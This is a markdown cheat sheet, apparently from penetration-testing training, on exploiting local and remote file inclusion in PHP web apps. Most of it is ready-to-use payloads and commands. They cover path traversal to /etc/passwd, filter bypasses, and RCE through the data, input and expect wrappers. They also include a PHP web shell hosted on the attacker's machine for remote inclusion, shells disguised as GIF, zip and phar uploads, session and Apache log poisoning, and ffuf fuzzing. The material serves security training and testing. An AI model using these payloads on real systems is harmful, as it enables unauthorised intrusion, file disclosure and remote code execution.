---
title: "File Inclusion (LFI/RFI)"
description: "LFI/RFI exploitation: wrappers, log/wrapper poisoning, RCE, filter bypass and common payloads."
category: web
tags: [web, lfi, rfi, injection]
tools: [curl]
difficulty: intermediate
updated: "2026-08-09"
source: "repo:HTB/cheatsheet-file-inclusion.pdf"
---

# File Inclusion (LFI/RFI)

Local and remote file inclusion reference: path traversal, filter bypasses, PHP wrappers, RCE via log/session poisoning, and inclusion-function behaviour by language. Examples assume a vulnerable `language` parameter.

## Local File Inclusion

### Basic LFI

```text
# Basic LFI
/index.php?language=/etc/passwd

# LFI with path traversal
/index.php?language=../../../../etc/passwd

# LFI with name prefix
/index.php?language=../../../etc/passwd

# LFI with an approved path
/index.php?language=./languages/../../../../etc/passwd
```

### LFI Bypasses

```text
# Bypass a basic (non-recursive) path traversal filter
/index.php?language=....//....//....//....//etc/passwd

# Bypass filters with URL encoding
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Bypass appended extension with path truncation (obsolete, pre-PHP 5.3)
/index.php?language=non_existing_directory/../../../etc/passwd/././././[./ REPEATED ~2048 times]

# Bypass appended extension with null byte (obsolete, pre-PHP 5.5)
/index.php?language=../../../../etc/passwd%00

# Read PHP source with the base64 filter
/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

## Remote Code Execution

### PHP Wrappers

```text
# RCE with the data wrapper (requires allow_url_include=On)
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg%3D%3D&cmd=id
```

```bash
# RCE with the input wrapper (requires allow_url_include=On)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"

# RCE with the expect wrapper (requires the expect extension)
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

### RFI

```bash
# Host a web shell (requires allow_url_include=On for code execution)
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>
```

```text
# Include the remote PHP web shell
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### LFI + File Upload

```bash
# Create a malicious image (GIF magic bytes + PHP)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```text
# RCE with the malicious uploaded image
/index.php?language=./profile_images/shell.gif&cmd=id
```

```bash
# Create a malicious zip archive named as a .jpg
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```text
# RCE with the malicious uploaded zip (via zip:// wrapper)
/index.php?language=zip://shell.zip%23shell.php&cmd=id
```

```bash
# Create a malicious phar named as a .jpg
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```text
# RCE with the malicious uploaded phar (via phar:// wrapper)
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### Log Poisoning

```text
# Read PHP session parameters
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

# Poison the PHP session with a web shell (URL-encoded <?php system($_GET["cmd"]); ?>)
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# RCE through the poisoned PHP session
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

```bash
# Poison the Apache access log via a malicious User-Agent
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```

```text
# RCE through the poisoned server log
/index.php?language=/var/log/apache2/access.log&cmd=id
```

## Fuzzing

```bash
# Fuzz page parameters
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

# Fuzz LFI payloads
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

# Fuzz the webroot path
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

# Fuzz server configurations
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

Useful wordlists: `LFI-Jhaddix.txt`, webroot path wordlists (Linux/Windows), and server-configuration wordlists (Linux/Windows).

## Inclusion Functions by Language

Behaviour of common file-handling functions — whether they read file content, execute code, and accept a remote URL.

| Language | Function | Read content | Execute | Remote URL |
|---|---|---|---|---|
| PHP | `include()` / `include_once()` | Yes | Yes | Yes |
| PHP | `require()` / `require_once()` | Yes | Yes | No |
| PHP | `file_get_contents()` | Yes | No | Yes |
| PHP | `fopen()` / `file()` | Yes | No | No |
| NodeJS | `fs.readFile()` | Yes | No | No |
| NodeJS | `fs.sendFile()` | Yes | No | No |
| NodeJS | `res.render()` | Yes | Yes | No |
| Java | `include` | Yes | No | No |
| Java | `import` | Yes | Yes | Yes |
| .NET | `@Html.Partial()` | Yes | No | No |
| .NET | `@Html.RemotePartial()` | Yes | No | Yes |
| .NET | `Response.WriteFile()` | Yes | No | No |
| .NET | `include` | Yes | Yes | Yes |

> **Note —** `Read content: Yes / Execute: Yes` functions are directly exploitable for RCE. `Remote URL: Yes` functions enable RFI. Read-only functions are still useful for sensitive-file disclosure and source-code review.
